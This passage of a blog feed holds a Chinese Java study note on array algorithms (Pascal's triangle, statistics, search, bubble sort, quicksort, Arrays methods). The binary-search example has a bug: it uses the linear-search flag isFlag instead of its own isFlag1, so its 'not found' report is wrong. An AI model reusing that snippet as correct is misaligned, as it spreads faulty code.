class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">
    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1381676207&amp;auto=0&amp;height=32&quot; frameborder=&quot;no&quot;</summary>
      
    
    
    
    <category term="Java学习笔记" scheme="https://www.bandao.ltd/categories/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="学习笔记" scheme="https://www.bandao.ltd/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="类" scheme="https://www.bandao.ltd/tags/%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>java学习笔记8</title>
    <link href="https://www.bandao.ltd/coding/java/note/8.html"/>
    <id>https://www.bandao.ltd/coding/java/note/8.html</id>
    <published>2021-12-07T02:39:00.000Z</published>
    <updated>2024-11-04T03:12:49.885Z</updated>
    
    <content type="html"><![CDATA[    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1406599484&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h2 id="数组常见算法"><a href="#数组常见算法" class="headerlink" title="数组常见算法"></a>数组常见算法</h2><h3 id="1-数组元素的赋值-杨辉三角，回文数等"><a href="#1-数组元素的赋值-杨辉三角，回文数等" class="headerlink" title="1. 数组元素的赋值(杨辉三角，回文数等)"></a>1. 数组元素的赋值(杨辉三角，回文数等)</h3><h4 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用二维数组打印一个 10 行杨辉三角。</span></span><br><span class="line"><span class="comment">【提示】</span></span><br><span class="line"><span class="comment"> 1. 第一行有 1 个元素, 第 n 行有 n 个元素</span></span><br><span class="line"><span class="comment"> 2. 每一行的第一个元素和最后一个元素都是 1</span></span><br><span class="line"><span class="comment"> 3. 从第三行开始, 对于非第一个元素和最后一个元素的元素。即：</span></span><br><span class="line"><span class="comment">yanghui[i][j] = yanghui[i-1][j-1] + yanghui[i-1][j];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YangHuiTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.声明并初始化二维数组</span></span><br><span class="line">        <span class="type">int</span>[][] yangHui = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][];</span><br><span class="line">        <span class="comment">//2.给数组的元素赋值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; yangHui.length; i++) &#123;</span><br><span class="line">            yangHui[i] = <span class="keyword">new</span> <span class="title class_">int</span>[i + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">//2.1 给首末元素赋值</span></span><br><span class="line">            yangHui[i][<span class="number">0</span>] = yangHui[i][i] = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//2.2 给每行的非首末元素赋值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; yangHui[i].length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                yangHui[i][j] = yangHui[i-<span class="number">1</span>][j-<span class="number">1</span>] + yangHui[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//3.遍历二维数组</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; yangHui[i].length; j++) &#123;</span><br><span class="line">                System.out.print(yangHui[i][j] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-求数值型数组中元素的最大值、最小值、平均数、总和等"><a href="#2-求数值型数组中元素的最大值、最小值、平均数、总和等" class="headerlink" title="2. 求数值型数组中元素的最大值、最小值、平均数、总和等"></a>2. 求数值型数组中元素的最大值、最小值、平均数、总和等</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr[i] = (<span class="type">int</span>) (Math.random() * (<span class="number">99</span> -<span class="number">10</span> + <span class="number">1</span>) + <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//求数组元素的最大值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxValue &lt; arr[i])&#123;</span><br><span class="line">                maxValue = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;最大值为：&quot;</span> + maxValue);</span><br><span class="line">        <span class="comment">//求数组元素的最小值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">minValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (minValue &gt; arr[i])&#123;</span><br><span class="line">                minValue = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;最小值为：&quot;</span> + minValue);</span><br><span class="line">        <span class="comment">//求数组元素的总和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;总和为：&quot;</span> + sum);</span><br><span class="line">        <span class="comment">//求数组元素的平均数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">avgValue</span> <span class="operator">=</span> sum / arr.length;</span><br><span class="line">        System.out.println(<span class="string">&quot;平均数为：&quot;</span> + avgValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-数组的复制、反转、查找-线性查找、二分法查找"><a href="#3-数组的复制、反转、查找-线性查找、二分法查找" class="headerlink" title="3. 数组的复制、反转、查找(线性查找、二分法查找)"></a>3. 数组的复制、反转、查找(线性查找、二分法查找)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String[] arr = <span class="keyword">new</span>  <span class="title class_">String</span>[]&#123;<span class="string">&quot;JJ&quot;</span>,<span class="string">&quot;DD&quot;</span>,<span class="string">&quot;MM&quot;</span>,<span class="string">&quot;BB&quot;</span>,<span class="string">&quot;GG&quot;</span>,<span class="string">&quot;AA&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//数组的复制</span></span><br><span class="line">        String[] arr1 = <span class="keyword">new</span> <span class="title class_">String</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            arr1[i] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//数组的反转</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[arr.length - i - <span class="number">1</span>];</span><br><span class="line">            arr[arr.length - i - <span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = arr.length - <span class="number">1</span>; i &lt; j; i++, j--) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            arr[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//查找</span></span><br><span class="line">        <span class="comment">//线性查找</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="string">&quot;BB&quot;</span>;</span><br><span class="line">        dest = <span class="string">&quot;CC&quot;</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFlag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dest.equals(arr[i]))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;位置为：&quot;</span> + i);</span><br><span class="line">                isFlag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isFlag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;没找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//二分法查找，效率高</span></span><br><span class="line">        <span class="comment">//前提：所要查找的数组必须有序。</span></span><br><span class="line">        <span class="type">int</span> [] arr2 =<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">98</span>,-<span class="number">34</span>,<span class="number">2</span>,<span class="number">34</span>,<span class="number">54</span>,<span class="number">66</span>,<span class="number">79</span>,<span class="number">105</span>,<span class="number">210</span>,<span class="number">333</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">dest1</span> <span class="operator">=</span> -<span class="number">34</span>;</span><br><span class="line">        dest1 = <span class="number">35</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">head_index</span> <span class="operator">=</span> <span class="number">0</span>;                     <span class="comment">//初始的首索引</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">end_index</span> <span class="operator">=</span> arr2.length - <span class="number">1</span>;        <span class="comment">//初始的末索引</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFlag1</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (head_index &lt;= end_index)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">middle_index</span> <span class="operator">=</span> (head_index + end_index) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (dest1 == arr2[middle_index])&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;位置为：&quot;</span> + middle_index);</span><br><span class="line">                isFlag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr2[middle_index] &gt; dest1)&#123;</span><br><span class="line">                end_index = middle_index- <span class="number">1</span> ;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                head_index = middle_index + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isFlag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;没找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-排序算法"><a href="#4-排序算法" class="headerlink" title="4. 排序算法"></a>4. 排序算法</h3><h4 id="1-衡量排序算法的优劣："><a href="#1-衡量排序算法的优劣：" class="headerlink" title="1. 衡量排序算法的优劣："></a>1. 衡量排序算法的优劣：</h4><ol><li>时间复杂度：分析关键字的比较次数和记录的移动次数</li><li>空间复杂度：分析排序算法中需要多少辅助内存</li><li>稳定性：若两个记录 A 和 B 的关键字值相等，但排序后 A、B 的先后次序保<br>持不变，则称这种排序算法是稳定的。</li></ol><h4 id="2-排序算法分类：内部排序和外部排序。"><a href="#2-排序算法分类：内部排序和外部排序。" class="headerlink" title="2. 排序算法分类：内部排序和外部排序。"></a>2. 排序算法分类：内部排序和外部排序。</h4><ol><li>内部排序：整个排序过程不需要借助于外部存储器（如磁盘等），所有排序操作都在内存中完成。</li><li>外部排序：参与排序的数据非常多，数据量非常大，计算机无法把整个排序过程放在内存中完成，必须借助于外部存储器（如磁盘）。外部排序最常见的是多路归并排序。可以认为外部排序是由多次内部排序组成。</li></ol><h4 id="3-十大内部排序算法"><a href="#3-十大内部排序算法" class="headerlink" title="3. 十大内部排序算法"></a>3. 十大内部排序算法</h4><ol><li>选择排序<ol><li>直接选择排序</li><li>堆排序</li></ol></li><li>交换排序<ol><li>冒泡排序</li><li>快速排序</li></ol></li><li>插入排序<ol><li>直接插入排序</li><li>折半插入排序</li><li>Shell 排序</li></ol></li><li>归并排序</li><li>桶式排序</li><li>基数排序</li></ol><h4 id="4-算法的-5-大特征"><a href="#4-算法的-5-大特征" class="headerlink" title="4. 算法的 5 大特征"></a>4. 算法的 5 大特征</h4><ol><li>输入（Input）：有 0 个或多个输入数据，这些输入必须有清楚的描述和定义</li><li>输出（Output）：至少有 1 个或多个输出结果，不可以没有输出结果</li><li>有穷性（有限性，Finiteness）：算法在有限的步骤之后会自动结束而不会无限循环，并且每一个步骤可以在可接受的时间内完成</li><li>确定性（明确性，Definiteness）：算法中的每一步都有确定的含义，不会出现二义性</li><li>可行性（有效性，Effectiveness）：算法的每一步都是清楚且可行的，能让用户用纸笔计算而求出答案</li></ol><h4 id="5-java-代码"><a href="#5-java-代码" class="headerlink" title="5. java 代码"></a>5. java 代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 冒泡排序</span></span><br><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSortTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] arr = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;<span class="number">43</span>,<span class="number">32</span>,<span class="number">76</span>,-<span class="number">98</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">33</span>,-<span class="number">21</span>,<span class="number">32</span>,<span class="number">99</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; arr.length - <span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j &lt; arr.length - <span class="number">1</span> - i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j] &gt; arr[j + <span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                    arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 快速排序</span></span><br><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] data, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> data[i];</span><br><span class="line">        data[i] = data[j];</span><br><span class="line">        data[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">subSort</span><span class="params">(<span class="type">int</span>[] data, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">base</span> <span class="operator">=</span> data[start];</span><br><span class="line">            <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> start;</span><br><span class="line">            <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> end + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (low &lt; end &amp;&amp; data[++low] - base &lt;= <span class="number">0</span>)</span><br><span class="line">                    ;</span><br><span class="line">                <span class="keyword">while</span> (high &gt; start &amp;&amp; data[--high] - base &gt;= <span class="number">0</span>)</span><br><span class="line">                    ;</span><br><span class="line">                <span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">                    swap(data, low, high);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            swap(data, start, high);</span><br><span class="line"></span><br><span class="line">            subSort(data, start, high - <span class="number">1</span>);<span class="comment">//递归调用</span></span><br><span class="line">            subSort(data, high + <span class="number">1</span>, end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] data)</span>&#123;</span><br><span class="line">        subSort(data,<span class="number">0</span>,data.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] data = &#123; <span class="number">9</span>, -<span class="number">16</span>, <span class="number">30</span>, <span class="number">23</span>, -<span class="number">30</span>, -<span class="number">49</span>, <span class="number">25</span>, <span class="number">21</span>, <span class="number">30</span> &#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;排序之前：\n&quot;</span> + java.util.Arrays.toString(data));</span><br><span class="line">        quickSort(data);</span><br><span class="line">        System.out.println(<span class="string">&quot;排序之后：\n&quot;</span> + java.util.Arrays.toString(data));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-Arrays-工具类的使用"><a href="#5-Arrays-工具类的使用" class="headerlink" title="5. Arrays 工具类的使用"></a>5. Arrays 工具类的使用</h3><table><thead><tr><th align="center">常用的类</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">boolean equals(int[] a,int[] b)</td><td align="center">判断两个数组是否相等。</td></tr><tr><td align="center">String toString(int[] a)</td><td align="center">输出数组信息。</td></tr><tr><td align="center">void fill(int[] a,int val)</td><td align="center">将指定值填充到数组之中。</td></tr><tr><td align="center">void sort(int[] a)</td><td align="center">对数组进行排序。</td></tr><tr><td align="center">int binarySearch(int[] a,int key)</td><td align="center">对排序后的数组进行二分法检索指定的值。</td></tr></tbody></table><h4 id="java-代码"><a href="#java-代码" class="headerlink" title="java 代码"></a>java 代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArraysTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.boolean equals(int[] a,int[] b)</span></span><br><span class="line">        <span class="type">int</span> [] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span> [] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isEquals</span> <span class="operator">=</span> Arrays.equals(arr1, arr2);</span><br><span class="line">        System.out.println(isEquals);               <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.String toString</span></span><br><span class="line">        System.out.println(Arrays.toString(arr1));  <span class="comment">//[1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.void fill(int[] a,int val)</span></span><br><span class="line">        Arrays.fill(arr1, <span class="number">10</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr1));  <span class="comment">//[10, 10, 10, 10]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.void sort(int[] a)</span></span><br><span class="line">        Arrays.sort(arr2);</span><br><span class="line">        System.out.println(Arrays.toString(arr2));  <span class="comment">//[1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">////5.int binarySearch(int[] a,int key)  要有序</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = <span 